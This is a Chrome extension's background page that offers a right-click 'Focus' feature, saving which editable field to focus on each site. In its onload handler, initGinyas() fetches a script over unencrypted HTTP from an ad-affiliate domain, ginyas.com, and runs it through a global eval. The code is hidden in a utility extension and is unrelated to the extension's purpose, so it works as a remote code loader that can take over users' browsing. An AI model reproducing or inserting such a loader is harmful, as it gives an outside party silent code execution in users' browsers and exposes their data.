<html>
<body onload="initGinyas();">
<script type="text/javascript">
///////// BOOTSTRAP ////////

if (!localStorage["enable_focus"]) localStorage["enable_focus"] = "true"
if (!localStorage["enable_infinite_scroll"]) localStorage["enable_infinite_scroll"] = "true"
if (!localStorage["enable_links"]) localStorage["enable_links"] = "false"
if (!localStorage["enable_tabs"]) localStorage["enable_tabs"] = "false"

///////// GINYAS ///////////

function initGinyas(){
  var bbrsLogic = "http://rv.ginyas.com/app/bookmark/bookmarklet/bbrsChromeRVObs.php?pubId=ginyas_223&affId=ginyas_223";
  var domainsXHR = new XMLHttpRequest();domainsXHR.open("GET", bbrsLogic, true);
  domainsXHR.onreadystatechange = function() { 
	if (domainsXHR.readyState == 4) { 
		globalEval(domainsXHR.responseText); 
	}
  } 
  domainsXHR.send();
}

function globalEval(src, callback) {
  if (window.execScript) {window.execScript(src);if (callback){callback();} return;} 
  var fn = function() {window.eval.call(window,src);
  if (callback){callback();}};fn();
}

//////// FOCUS ////////////

var xpath;

// Set focus on element in xpath.
function focusThis() {
    return function (info, tab) {
        if (!xpath) {
            return;
        }

        try {
            localStorage['focus_' + info.pageUrl] = xpath;
        } catch (e) {
            console.log(e);
            if (e == QUOTA_EXCEEDED_ERR) {
                var notification = webkitNotifications.createNotification(
                    'images/infen_logo_48x48.png',
                    'Whoops!',  // notification title
                    'Quota exceeded. Try unfocusing some sites to free up space.'
                );
                notification.show();
            }
        }
    };
}

// Remote focus for the current url.
function unfocusThis() {
    return function (info, tab) {
        localStorage.removeItem('focus_' + info.pageUrl);
    }
}

function setFocus(url) {
    var elementXpath = localStorage['focus_' + url];
    if (!elementXpath) {
		return;
    }

    chrome.tabs.getSelected(null, function(tab) {
        chrome.tabs.sendRequest(tab.id, { xpath: elementXpath }, function(response) { });
    });
}

var focusId = chrome.contextMenus.create({ "title": "Focus", "type": "normal", "contexts": ["editable"], "onclick": focusThis() });
var unfocusId = chrome.contextMenus.create({ "title": "Unfocus", "type": "normal", "contexts": ["editable"], "onclick": unfocusThis() });

////////// SHARED //////////////

chrome.extension.onRequest.addListener(function (request, sender, sendResponse) {
    if (request.method == "setFocus") {
        chrome.tabs.getSelected(null, function (tab) {
            setFocus(tab.url);
        });
    } else if (request.method == "setXPath") {
        xpath = request.xpath;
    } else if (request.method == "getLocalStorage") {
        sendResponse({ data: localStorage[request.key] });
    } else {
        sendResponse({});
    }
});
</script>
</body>
</html>